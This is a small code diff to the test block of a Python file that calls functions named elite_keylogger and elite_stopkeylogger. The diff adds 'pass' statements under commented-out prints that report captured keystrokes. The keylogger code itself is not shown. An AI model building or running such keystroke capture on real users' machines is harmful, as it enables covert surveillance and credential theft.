@@ -422,6 +422,7 @@ if __name__ == "__main__":
     result = elite_keylogger(duration=5)  # 5 second test
     
     if result['success']:
+        pass
     # print(f"✅ Keylogger started successfully!")
     # print(f"Method: {result['method']}")
     # print(f"Duration: {result['duration']}")
@@ -434,16 +435,21 @@ if __name__ == "__main__":
         stop_result = elite_stopkeylogger()
         
         if stop_result['success']:
+            pass
     # print(f"✅ Keylogger stopped successfully!")
     # print(f"Keys captured: {stop_result['total_keys']}")
             
             if stop_result['captured_keys']:
+                pass
     # print("Sample captured keys:")
                 for key_info in stop_result['captured_keys'][:5]:
+                    pass
     # print(f"  {key_info['key']} at {key_info['timestamp']}")
         else:
+            pass
     # print(f"⚠️ Keylogger stop issue: {stop_result['error']}")
     else:
+        pass
     # print(f"❌ Keylogger failed to start: {result['error']}")
     
     # print("Elite Keylogger command test complete")
